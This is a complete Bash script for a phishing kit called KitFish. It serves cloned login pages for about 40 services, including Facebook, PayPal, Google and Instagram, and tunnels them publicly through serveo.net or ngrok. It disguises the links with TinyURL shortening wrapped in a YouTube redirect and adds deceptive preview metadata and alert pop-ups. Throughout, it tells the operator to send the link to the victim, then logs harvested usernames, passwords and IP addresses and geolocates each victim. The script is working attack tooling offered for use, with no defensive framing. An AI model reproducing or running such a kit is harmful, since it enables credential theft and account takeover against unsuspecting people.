trap 'printf "\n";stop;exit 1' 2
DARKGRAY='\033[1;30m'
RED='\033[0;31m'
LIGHTRED='\033[1;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
LIGHTPURPLE='\033[1;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
DEFAULT='\033[0m'
r="\e[1;91m"
v="\e[1;92m"
a="\e[1;93m"
b="\e[1;39m"
m="\e[1;96m"
z="\e[1;94m"
rnd=`shuf -i 3000-10000 -n 1`
crnd=`shuf -i 1-9 -n 1`
DIA=`date +"%d/%m/%Y"`
HORA=`date +"%H:%M"`
link="localhost:$rnd"
brnd=`shuf -i 1-7 -n 1`
banner="a$brnd"
s="m"
bcolor="\e[1;3$crnd$s"
COLORS=($DARKGRAY $RED $LIGHTRED $GREEN $YELLOW $BLUE $PURPLE $LIGHTPURPLE $CYAN $WHITE )

#Banners
dev(){
echo -e "\e[1;92m					dev\e[1;39m > theb3st"

}

bye(){
printf "$r ██████████\e[1;39m██████████\e[1;31m██████████\e[1;39m\n\n"
printf "https://github.com/theb3st/kitfish"
printf "\n\n"
printf "\e[1;33m[*]\e[1;32m Phishing tool 1.0\e[1;33m [*]\n\n\e[1;33m[!]\e[1;39m"
printf " \e[1;39mDo not modify any files\e[0m\e[1;33m [!]\e[0m"
printf "\n"
echo
echo
}


a1(){
echo "    __  _  ____  ______  _____  ____ ____  __ __"
echo "   |  |/ ]|    ||      ||     ||    / ___/|  |  |";
echo "   |  ' /  |  | |      ||   __| |  (   \_ |  |  |";
echo "   |    \  |  | |_|  |_||  |_   |  |\__  ||  _  |";
echo "   |     | |  |   |  |  |   _]  |  |/  \ ||  |  |";
echo "   |  .  | |  |   |  |  |  |    |  |\    ||  |  |";
echo "   |__|\_||____|  |__|  |__|   |____|\___||__|__|";
echo "                                              ";


					dev
bye

}

a2(){
echo -e '

     ____  __.__  __ ___________.__       .__
    |    |/ _|__|/  |\_   _____/|__| _____|  |__
    |      < |  \   __\    __)  |  |/  ___/  |  \
    |    |  \|  ||  | |     \   |  |\___ \|   Y  \
    |____|__ \__||__| \___  /   |__/____  >___|  /
            \/            \/            \/     \/
'
					 dev
bye

}

a3(){

echo "           _ _     ___ _     _     _     ";
echo "      /\ /(_) |_  / __\ |__ (_)___| |__  ";
echo "     / //_/ | __|/ _\ | '_ \| / __| '_ \ ";
echo "    / __ \| | |_/ /   | | | | \__ \ | | |";
echo "    \/  \/|_|\__\/    |_| |_|_|___/_| |_|";
echo "                                     ";

						dev
bye
}

a4(){
echo "                                                            ";
echo "                                                            ";
echo "     .     .--.                   .--.          .           ";
echo "   .'|     |__|              _.._ |__|        .'|           ";
echo " .'  |     .--.     .|     .' .._|.--.       <  |           ";
echo "<    |     |  |   .' |_    | '    |  |        | |           ";
echo " |   | ____|  | .'     | __| |__  |  |     _  | | .'''-.    ";
echo " |   | \ .'|  |'--.  .-'|__   __| |  |   .' | | |/.'''. \   ";
echo " |   |/  . |  |   |  |     | |    |  |  .   | /  /    | |   ";
echo " |    /\  \|__|   |  |     | |    |__|.'.'| |// |     | |   ";
echo " |   |  \  \      |  '.'   | |      .'.'.-'  /| |     | |   ";
echo " '    \  \  \     |   /    | |      .'   \_.' | '.    | '.  ";
echo "'------'  '---'   \`'-'     |_|                '---'   '---' ";
					     dev
bye
}

a5(){
echo "      ___ ___ __ __   _______ __         __    ";
echo "     |   Y   )__|  |_|   _   |__|.-----.|  |--.";
echo "     |.  1  /|  |   _|.  1___|  ||__ --||     |";
echo "     |.  _  \|__|____|.  __) |__||_____||__|__|";
echo "     |:  |   \       |:  |                     ";
echo "     |::.| .  )      |::.|                     ";
echo "     \`--- ---'      \`---'                     ";
echo "                                               ";

dev
bye
}

a6(){


echo "      _  ___ _   _____ _     _     _     ";
echo "     | |/ (_) |_|  ___| |__ (_)___| |__  ";
echo "     | ' /| | __| |_  | '_ \| / __| '_ \ ";
echo "     | . \| | |_|  _| | | | | \__ \ | | |";
echo "     |_|\_\_|\__|_|   |_| |_|_|___/_| |_|";
echo "                                     ";
dev
bye
}

a7(){

echo ".____/\ .___ _____._._______.___.__  .___ .________.___.__  ";
echo ":   /  \: __|\__ _:|:_ ____/:   |  \ : __||    ___/:   |  \ ";
echo "|.  ___/| : |  |  :||   _/  |   :   || : ||___    \|   :   |";
echo "|     \ |   |  |   ||   |   |   .   ||   ||       /|   .   |";
echo "|      \|   |  |   ||_. |   |___|   ||   ||__:___/ |___|   |";
echo "|___\  /|___|  |___|  :/        |___||___|   :         |___|";
echo "     \/               :                                     ";
echo "                                                            ";
echo "                                                            ";
dev
bye
}

#MENU

packages() {
command -v php > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Installing PHP..."; pkg install php -y;}
command -v curl > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Installing curl..."; pkg install curl -y;}
command -v git > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Installing git..."; pkg install git -y;}
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
}

menu_help(){
echo -e "
$a[*]$v~~~~~~~~~~~~~~~~~~~~~~\e[1;39mAyuda\e[1;32m~~~~~~~~~~~~~~~~~~~~~$a[*]

$v Para el primer menú:

$b Selecciona un sitio web, para proceder con el phishing.

$a Ejemplo:

$b Eligo la opción 6, facebook

$v Para el segundo menú:

$b Selecciona el idioma de la pagina (español/ingles) solo en algunas paginas se puede elegir el idioma.

$v Para el tercer menú:

$b Selecciona el tunnel (serveo/ngrok) ngrok necesita una instalación, serveo es de uso mas sencillo.

$v Para el cuarto menú:

$a show title:$b mostrara un titulo al enviar el link a la victima.

$a show image:$b mostrara una imagen al enviar el link a la victima.

$a show description:$b mostrara una pequeña descripcion al enviar el link a la victima

$a show url:$b mostrara un url al enviar el link a la victima. default tu sessión de ngrok.

$a show alert box$b  mostrara un mensaje de alerta al entrar
al link.

$m Ejemplo:$b 'Primero debes iniciar sesión'.

$b Escogeras una opción con el numero indicado. Puedes añadir todas las opciones y/o no añadir ninguna.

$b Escribe run o start para iniciar con ajustes añadidos o sin ajustes añadidos.


$a[*]$v~~~~~~~~~~~~~~~~~~~~~~\e[1;39mHelp\e[1;32m~~~~~~~~~~~~~~~~~~~~~$a[*]
$v For the first menu:

$b Select a website to proceed with phishing.

$a Example:

$b I choose option 6, facebook

$v For the second menu:

$b Select the language of the page (Spanish / English) only in some pages you can choose the language. 

$v For the third menu:

$b Select the tunnel (serveo / ngrok) ngrok needs an installation, serveo is easier to use. 

$v For the fourth menu:

$a show title:$b will show a title when sending the link to the victim.

$a show image:$b it will show an image when sending the link to the victim.

$a show description:$b will show a small description when sending the link to the victim 

$a show url:$b it will show a url when sending the link to the victim. default your ngrok session. 

$a show alert box:$b will show an alert message when entering to the link.

$m Example:$b 'You must first login'. 

$b You will choose an option with the indicated number. You can add all the options and / or not add any. 

$b Type run or start to start with added settings or without added settings.
"

read -p $'\e[1;33mPRESS ENTER TO CONTINUE...' ps

if [[ $ps != "₩" ]];then
options
else
options
fi
}


menu(){
packages
echo -e $bcolor
$banner
echo
echo -e "$a[$b 1$v ]$b Amazon             $a[$b 21$v ]$b PlayStation    $a[$b 99$v ]$b Help"
echo -e "$a[$b 2$v ]$b Apple              $a[$b 22$v ]$b PrimeVideo     $a[$b 00$v ]$b Exit"
echo -e "$a[$b 3$v ]$b Badoo              $a[$b 23$v ]$b Protonmail"
echo -e "$a[$b 4$v ]$b Deviantart         $a[$b 24$v ]$b Reddit"
echo -e "$a[$b 5$v ]$b eBay               $a[$b 25$v ]$b Shopify"
echo -e "$a[$b 6$v ]$b Facebook           $a[$b 26$v ]$b Snapchat"
echo -e "$a[$b 7$v ]$b Foursquare         $a[$b 27$v ]$b Spotify"
echo -e "$a[$b 8$v ]$b Github             $a[$b 28$v ]$b Steam"
echo -e "$a[$b 9$v ]$b Google             $a[$b 29$v ]$b Twitch"
echo -e "$a[$b 10$v ]$b iCloud            $a[$b 30$v ]$b Twitter"
echo -e "$a[$b 11$v ]$b Imgur             $a[$b 31$v ]$b Verizon"
echo -e "$a[$b 12$v ]$b InstaFollowers    $a[$b 32$v ]$b Vimeo"
echo -e "$a[$b 13$v ]$b Instagram         $a[$b 33$v ]$b VK"
echo -e "$a[$b 14$v ]$b Linkedin          $a[$b 34$v ]$b Wifi"
echo -e "$a[$b 15$v ]$b Microsoft         $a[$b 35$v ]$b WordPress"
echo -e "$a[$b 16$v ]$b MySpace           $a[$b 36$v ]$b Yahoo"
echo -e "$a[$b 17$v ]$b Netflix           $a[$b 37$v ]$b Yandex"
echo -e "$a[$b 18$v ]$b Origin            $a[$b 38$v ]$b Yelp"
echo -e "$a[$b 19$v ]$b Paypal            $a[$b 39$v ]$b Adobe"
echo -e "$a[$b 20$v ]$b Pinterest         $a[$b 40$v ]$b Pornhub"

}



options(){
menu
echo
read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;92m Choose option\e[1;39m > ' opc

echo
if [[ $opc == "1" || $opc == "01" ]];then
web="amazon"
go

elif [[ $opc == "2" || $opc == "02" ]];then
web="apple"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "3" || $opc == "03" ]];then
web="badoo"
go

elif [[ $opc == "4" || $opc == "04" ]];then
web="devianart"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "5" || $opc == "05" ]];then
web="ebay"
go

elif [[ $opc == "6" || $opc == "06" ]];then
web="facebook"
go

elif [[ $opc == "7" || $opc == "07" ]];then
web="foursquare"
go

elif [[ $opc == "8" || $opc == "08" ]];then
web="github"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "9" || $opc == "09" ]];then
web="google"
go

elif [[ $opc == "10" ]];then
web="icloud"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "11" ]];then
web="imgur"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "12" ]];then
web="instafollowers"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "13" ]];then
web="instagram"
go

elif [[ $opc == "14" ]];then
web="linkedin"
go

elif [[ $opc == "15" ]];then
web="microsoft"
go

elif [[ $opc == "16" ]];then
web="myspace"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "17" ]];then
web="netflix"
go

elif [[ $opc == "18" ]];then
web="origin"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "19" ]];then
web="paypal"
go

elif [[ $opc == "20" ]];then
web="pinterest"
go

elif [[ $opc == "21" ]];then
web="play"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "22" ]];then
web="primevideo"
go

elif [[ $opc == "23" ]];then
web="proton"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "24" ]];then
web="reddit"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "25" ]];then
web="shopify"
go

elif [[ $opc == "26" ]];then
web="snapchat"
go

elif [[ $opc == "27" ]];then
web="spotify"
go

elif [[ $opc == "28" ]];then
web="steam"
go

elif [[ $opc == "29" ]];then
web="twitch"
go

elif [[ $opc == "30" ]];then
web="twitter"
go

elif [[ $opc == "31" ]];then
web="verizon"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "32" ]];then
web="vimeo"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "33" ]];then
web="vk"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "34" ]];then
web="wifi"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "35" ]];then
web="wordpress"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "36" ]];then
web="yahoo"
go

elif [[ $opc == "37" ]];then
web="yandex"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "38" ]];then
web="yelp"
go

elif [[ $opc == "39" ]];then
web="adobe"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "40" ]];then
web="pornhub"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "99" ]];then
menu_help

elif [[ $opc == "00" ]];then
sleep 0.5
exit

else
echo -e "$r [!]$b Unknown option, $opc"
sleep 0.5
options
fi
}

findngrok(){
if [[ -f ngrok ]];then
jajaj="g"
else
echo -e "$v[*]$b Installing ngrok...$a(size 13MB)$b Press CTRL^C to exit"
git clone https://github.com/theb3st/best-ngrok
cd best-ngrok
mv ngrok $OLDPWD
cd $OLDPWD
rm -rf best-ngrok
fi
}

tunnel(){
echo -e "$v[$b 1$v ] Serveo\e[1;93m(\e[1;39mSSH Tunnel\e[1;93m Best!!)"
echo -e "$v[$b 2$v ] Ngrok"

echo
read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;32m Choose Tunnel\e[1;39m > ' tunnel

if [[ $tunnel == "1" || $tunnel == "01" ]];then
cd $ruta_carpeta
clear_meta
menu_options
add_option
serveo
elif [[ $tunnel == "2" || $tunnel == "02" ]];then
cd $ruta_carpeta
clear_meta
menu_options
ls
add_option
ngrok
else
echo
echo -e "\e[1;91m[*]\e[1;39m Unknown option: $tunnel"
echo
sleep 0.5
tunnel
fi
}

list_fb(){
echo -e "$v[ 1 ]$b Facebook Free"
echo -e "$v[ 2 ]$b Facebook Datos"
echo -e "$v[ 3 ]$b Facebook Messenger"
}

killphp(){
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
}

killng(){
if [[ $checkngrok == *'ngrok'* ]];then
killall -2 ngrok > /dev/null 2>&1
fi
}


go(){
echo
echo -e "$v[\e[1;39m*$v] Select lenguage in page:"
echo
echo -e "$v[$b 1$v ]$v Español"
echo -e "$v[$b 2$v ]$v English"
echo -e "$v[$b 99$v ]$v Choose other page"
echo
read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;32m Choose option\e[1;39m > ' lg

echo
if [[ $lg == "1" || $lg == "01" ]];then
op="español"
#idioma="es"
ruta_carpeta="websites/$web/es"
echo -e "$v[*]$b Option > $a $op"
echo
tunnel
elif [[ $lg == "2" || $lg == "02" ]];then
op="english"
#idioma="us"
ruta_carpeta="websites/$web/us"
echo -e "$v[*]$b Option > $a $op"
echo
tunnel
elif [[ $lg == "99" ]];then
options
else
echo -e "$r[*]$b Unknown option: $lg"
sleep 0.5
go
fi
}

carpeta(){
cd websites/$web/$idioma
}

clear(){
rm websites/$web/$idioma/foundip.txt
}

serveo(){
command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Installing ssh..."; pkg install openssh -y;}
echo

read -p $'\e[1;33m[*]\e[1;32m Choose port(\e[1;39mdefault:3333\e[1;32m):\e[1;39m ' port

if [[ $port == "" ]];then
port=3333
fi
php -S localhost:$port > /dev/null 2>&1 & 

for c in "${COLORS[@]}";do
    printf "\r $c Staring $GREEN ... $DEFAULT "
    sleep 0.3
done
echo

if [[ -f link ]]; then
rm -rf link
fi

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > link ' &

for c in "${COLORS[@]}";do
    printf "\r $c Open PHP server $GREEN ... $DEFAULT "
    sleep 0.5
done
echo

for c in "${COLORS[@]}";do
    printf "\r $c Open Serveo $GREEN ... $DEFAULT "
    sleep 0.5
done
echo

for c in "${COLORS[@]}";do
    printf "\r $c Getting links $GREEN ... $DEFAULT "
    sleep 0.5
done
echo

serveo_link=$(grep -o "https://[0-9a-z]*\.serveo.net" link)
echo

for c in "${COLORS[@]}";do
    printf "\r $c Send link to victim: $GREEN $serveo_link"
    sleep 0.1
done
echo

send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)

for c in "${COLORS[@]}";do
    printf "\r $c Shortend link: $GREEN $send_ip"
    sleep 0.1
done
echo

if [[ -f link ]]; then
rm -rf link
fi
echo

check_found
}

ngrok(){
echo
killphp

php -S $link > /dev/null 2>&1 &
for c in "${COLORS[@]}";do
    printf "\r $c Staring $GREEN ... $DEFAULT "
    sleep 0.3
done
echo

cd $OLDPWD

findngrok

killng

./ngrok http $link > /dev/null 2>&1 &
 for c in "${COLORS[@]}";do
  printf "\r $c Opening PHP server$GREEN ... $DEFAULT "
    sleep 0.6
done

echo
for c in "${COLORS[@]}";do
   printf "\r $c Opening Ngrok server$GREEN ... $DEFAULT "
     sleep 0.6
done
echo
for c in "${COLORS[@]}";do
    printf "\r $c Getting links$GREEN ... $DEFAULT "
    sleep 0.6
done
echo
for c in "${COLORS[@]}";do
    printf "\r $c localhost: $GREEN $link"
    sleep 0.1
done
echo
ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
echo

for c in "${COLORS[@]}";do
    printf "\r $c Send link to victim: $GREEN $ngrok_link"
    sleep 0.1
done
echo
tinyurl=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$ngrok_link" | head -n1)

for c in "${COLORS[@]}";do
    printf "\r $c Shortend link: $GREEN $tinyurl"
    sleep 0.1
done
echo
echo

cd $ruta_carpeta
check_found
}


check_found(){
echo -e "$r[$b*$r]$b Waiting for data$r [$b*$r]"
echo -e $v
while true;do
if [[ -f foundip.txt ]];then
sed -i '3iIP Found: '"$HORA"' '"$DIA"'' foundip.txt
echo
echo -e "$v[*]$a IP Found!!"
found_ip
rm foundip.txt
sleep 0.5
fi

if [[ -f founduser.txt ]];then
sed -i '3iCredentials Found: '"$HORA"' '"$DIA"'' founduser.txt
echo -e "$v[*]$a Credentials Found!!"
found_user
rm founduser.txt
fi
sleep 0.5
done

}

found_ip(){
ip=$(grep -a 'IP:' foundip.txt | cut -d " " -f2 | tr -d '\r')
agent=$(grep 'User-Agent:.*' foundip.txt | cut -d ':' -f2)
saved_to="\e[1;33mIP Saved:$b $ruta_carpeta/ip.txt"
echo -e "$a[*]$v IP:$b " $ip
echo
echo -e  "$a[*]$v User-Agent:$b"$agent
echo
echo -e $saved_to
cat foundip.txt >> ip.txt
echo
dates_ip
echo
echo -e "$v[$b*$v]$b Waiting for next ip or credentials$v [$b*$v]"
echo
}

found_user(){
account=$(grep -o 'Username:.*' founduser.txt | cut -d " " -f2)
password=$(grep -o 'Password:.*' founduser.txt | cut -d ":" -f2)
saved_to="\e[1;33mCredentials Saved:$b $ruta_carpeta/account.txt"
echo -e "$a[*]$v Username:$b" $account
echo -e "$a[*]$v Password:$b" $password
echo
echo -e $saved_to
cat founduser.txt >> account.txt
echo
echo -e "$v[$b*$v]$b Waiting for next ip or credentials$v [$b*$v]"
echo
}


dates_ip(){
if [[ -f infoip ]];then
rm infoip
fi

ipfind=$(curl -s -L "http://ip-api.com/json/$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > infoip)
query=$(grep -o '"query":.*' infoip | cut -d '"' -f4)

if [[ $query == "" ]]; then
echo -e "$v[*] Hostname:$b Unknown"
else
echo -e "$v[*] Hostname:$b" $query
fi

country=$(grep -o '"country":.*' infoip | cut -d '"' -f4)

if [[ $country == "" ]]; then

echo -e "$v[*] Country:$b Unknown"
else
echo -e "$v[*] Country:$b" $country
fi

cc=$(grep -o '"countryCode":.*' infoip | cut -d '"' -f4)

if [[ $cc == "" ]];then
echo -e "$v[*] Country Code:$b Unknown"
else
echo -e "$v[*] Country Code:$b" $cc
fi


rn=$(grep -o '"regionName":.*' infoip | cut -d '"' -f4)
if [[ $rn == "" ]];then
echo -e "$v[*] Region:$b Unknown"

else
echo -e "$v[*] Region:$b" $rn
fi

city=$(grep -o '"city":.*' infoip | cut -d '"' -f4)
if [[ $city == "" ]];then
echo -e "$v[*] City:b Unknown"
else
echo -e "$v[*] City:$b" $city
fi

zip=$(grep -o '"zip":.*' infoip | cut -d '"' -f4)
if [[ $zip == "" ]];then
echo -e "$v[*] zip:$b Unknown"
else
echo -e "$v[*] zip:$b" $zip
fi

tz=$(grep -o '"timezone":.*' infoip | cut -d '"' -f4)
if [[ $tz == "" ]];then
echo -e "$v[*] Time Zone:$b Unknown"
else
echo -e "$v[*] Time Zone:$b" $tz
fi

isp=$(grep -o '"isp".*' infoip | cut -d '"' -f4)
if [[ $isp == "" ]];then

echo -e "$v[*] ISP:$b Unknown"
else
echo -e "$v[*] ISP:$b" $isp
fi

org=$(grep -o '"org":.*' infoip | cut -d '"' -f4)
if [[ $org == "" ]];then
echo -e "$v[*] org:$b Unknown"
else
echo -e "$v[*] org:$b" $org
fi

as=$(grep -o '"as":.*' infoip | cut -d '"' -f4)
if [[ $as == "" ]];then
echo -e "$v[*] AS:$b Unknown"
else
echo -e "$v[*] AS:$b" $as
fi

lan=$(grep -o '"lat":.*' infoip | cut -d '"' -f3 | cut -d ':' -f2 | cut -d ',' -f1)
lon=$(grep -o '"lon":.*' infoip | cut -d '"' -f3 | cut -d ':' -f2 | cut -d ',' -f1)

if [[ $lan == "" || $lon == "" ]];then
echo -e "$v[*] Google Maps:$b Unknown"
else
link_maps="https://www.google.com/maps/place/$lan,$lon"
echo -e "$v[*] Google Maps:$b" $link_maps

rm infoip
fi
}

#MAS OPCIONES

clear_meta(){
if [[ -f link ]];then
rm link
fi

if [[ -d images ]];then
rm -rf images
fi

if [[ -f alert.js ]];then
rm alert.js
fi

if [[ -f infoip ]];then
rm infoip
fi

sed -i "/<meta property='og:.*' content='.*'/d" ./index.html
sed -i "/<script src='alert.js'/d" ./index.html
}

menu_options(){
echo
echo -e "$v[$b~$v]~~~~~~~~~~~~\e[1;39mMore Options$v~~~~~~~~~~~~$v[$b~$v]$v"
echo
echo -e "\e[1;39mAt the time of sending the link to the victim:"
echo
echo -e "$v[$b 1$v ] Show Title:$b show a title do not exceed characters"
echo -e "$v[$b 2$v ] Show Image:$b show an image on the left"
echo -e "$v[$b 3$v ] Show Descripcion:$b show description do not exceed"
echo -e "$v[$b 4$v ] Show Url:$b show url default your ngrok session"
echo
echo -e "At the time of entering the page:"
echo
echo -e "$v[$b 5$v ] Show alert box:$b show a popup before login"
echo
echo -e "\e[1;39mto stared:"
echo
echo -e "\e[1;36mType$b run or start for stared."
echo
echo -e "$v[$b~$v]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$b~$v]$v"
}
add_option(){
echo
read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;32m More options\e[1;39m > ' addopc
if [[ $addopc == "1" || $addopc == "01" ]];then
echo
show_title

elif [[ $addopc == "2" || $addopc == "02" ]];then
echo
show_photo

elif [[ $addopc == "3" || $addopc == "03" ]];then
echo
show_text

elif [[ $addopc == "4" || $addopc == "04" ]];then
echo
show_url

elif [[ $addopc == "5" || $addopc == "05" ]];then
echo
add_alert_box

elif [[ $addopc == "run" || $addopc == "Run" || $addopc == "start" || $addopc == "Start" ]];then
jajaj="hola"

else
echo
echo -e "$r[!]$b Unknown option > $addopc"

add_option
fi
}

show_title(){
read -p $'\e[1;33m[*]\e[1;32m Write your title\e[1;39m > ' title
if [[ $title == "" ]];then
echo -e "$r[!]$b Zorry, type your title"
show_title
else
ogtitle="<meta property='og:title' content='$title'/>"
sed -i "/<meta property='og:title' content='.*'/d" ./index.html
sed -i '4i '"$ogtitle"'' index.html
echo
echo -e "$b[*]$v Title added successfully$b > $title"
fi
add_option
}

show_photo(){
if [[ -d images ]];then
rm -rf images
fi

read -p $'\e[1;33m[*]\e[1;32m Write the image path\e[1;39m > ' ruta
if [[ $ruta == "" ]];then
echo -e "$r[!]$b Zorry, type your image"
show_photo
else
if [[ -f $ruta ]];then

if [[ -d images ]];then
rm -rf images
fi

mkdir images
cp "$ruta" images
obtener_name=$(basename "$ruta")
total="/images/$obtener_name"
ogimg="<meta property='og:image' content='$total'/>"
sed -i "/<meta property='og:image' content='.*'/d" ./index.html
sed -i '4i '"$ogimg"'' index.html
echo
echo -e "$b[*]$v Image added$b > " $ruta

else
echo
echo -e "$r[!]$b Image no exists"
echo
show_photo
fi
fi
add_option

}

show_text(){
read -p $'\e[1;33m[*]\e[1;32m Write your description\e[1;39m > ' text

if [[ $text == "" ]];then
echo -e "$r[!]$b Zorry, type your description"
show_text
else
ogtext="<meta property='og:description' content='$text' />"
sed -i "/<meta property='og:description' content='.*'/d" ./index.html
sed -i '4i '"$ogtext"'' index.html
echo
echo -e "$b[*]$v Descripcion added successfully$a!!"
fi

add_option


}

show_url(){
read -p $'\e[1;33m[*]\e[1;32m Write your url \e[1;39m> ' url

if [[ $url == "" ]];then
echo -e "$r[!]b Zorry, type your url"
show_url
else
ogurl="<meta property='og:url' content='http://$url' />"
sed -i "/<meta property='og:url' content='.*'/d" ./index.html
sed -i '4i '"$ogurl"'' index.html
echo
echo -e "$b[*]$v Url added!! $b> $url"
fi
add_option
}

add_alert_box(){
read -p $'\e[1;33m[*]\e[1;32m Write your alert\e[1;39m > ' alert

if [[ $alert == "" ]];then
echo -e "$r[!]$b Zorry, type your message"
add_alert_box
else
ogalert="<script src='alert.js'/>"
sed -i "/<script src='alert.js'/d" ./index.html

if [[ -f alert.js ]];then
rm alert.js
fi

echo "alert('$alert');" >> alert.js
sed -i '4i '"$ogalert"'' index.html
echo
echo -e "$b[*]$v Alert box added successfully!! $b> "$alert
fi
add_option
}

options

